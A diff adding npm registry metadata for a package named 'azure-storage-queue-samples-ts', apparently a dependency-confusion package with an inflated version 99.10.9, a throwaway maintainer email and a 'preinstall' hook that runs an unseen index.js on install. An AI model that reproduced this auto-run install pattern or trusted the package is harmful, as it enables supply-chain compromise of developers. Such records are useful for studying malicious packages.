@@ -1,0 +1,62 @@
+{
+    "_id": "azure-storage-queue-samples-ts",
+    "name": "azure-storage-queue-samples-ts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-storage-queue-samples-ts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-storage-queue-samples-ts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-vqtKYUYGy5PeRK4EmZouXJc6vE/Yaln4C0Nxj/sRvkn5sYCcbKyLO8T75OgCPbAFSHpw68g2lCsDHUb04RT0Ug==",
+                "shasum": "3bca412bf265dd3245843a3a97c62e394bdd5f8d",
+                "tarball": "https://registry.npmjs.org/azure-storage-queue-samples-ts/-/azure-storage-queue-samples-ts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5082,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOs+6ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpb4BAAhjEswYx+NrC2KCYJTdlr/8WcBs7eSN4FKOpGyaxOQ/CHeuTJ\r\n5P/ljFtk1sXVN4avMTW/5G147YPghu6i+tcDFeRBZKe3A+iDmTOrC6lRIEbK\r\n3e8yyeUbYonRzQdqoPIrsNDeHj65b2bLl7yH6avY49NqyarOMmP4BDfxo+br\r\nKCOPH8Y/DGArkBo1vbXJospIuPDHudzHUK2oWc0WoLxzUsAOlihnfL7rud63\r\nM2x38IHSGiZfPKrbIVPG7eCh2DUBisTq8eDSXT3qVWWmwV0IqEBIX7EiKBWR\r\nnR3CYJBE7f+DPy3YbsJw+jOZVzoHEgkN/Q616Dq4iEFfcOcP0EjtTLs7MSxS\r\n9pHVt32itYYuuESsV6Hks/IxCxsZ7XgImxJpG1299QF7K30jT56byh33MiNo\r\n3+cIyWyDBwQjtbB3wWIquMr5YthWMFZ7HD4APj0+YuNBqGG+uMnOTSC3xDrJ\r\nUbQYXDEt2POtK6XvjQE/3xToP5mvykI2Lxg+nKqqardajDD1ncyi6+6Q3nPf\r\nUJTR5T6zKDerYKzH2fJWZSFQ+VFmFuwv1/nadil51CxFp5Pu7ZsVi0lH1jbt\r\nkOUp3eO3s6OYi50kJuMknhI5g3phkCMAw9d+VKKzQXrQaHvZpm/hDvJnQY/v\r\nbmHIKqcOwgsxQxk01Y643yAd3m3BqMSQgdM=\r\n=mW6s\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "q2stmezp",
+                "email": "q2stmezp@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "q2stmezp",
+                    "email": "q2stmezp@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-storage-queue-samples-ts_99.10.9_1648021434428_0.8700242759003027"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T07:43:54.428Z",
+        "99.10.9": "2022-03-23T07:43:54.588Z",
+        "modified": "2022-03-23T07:43:54.704Z"
+    },
+    "maintainers": [
+        {
+            "name": "q2stmezp",
+            "email": "q2stmezp@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
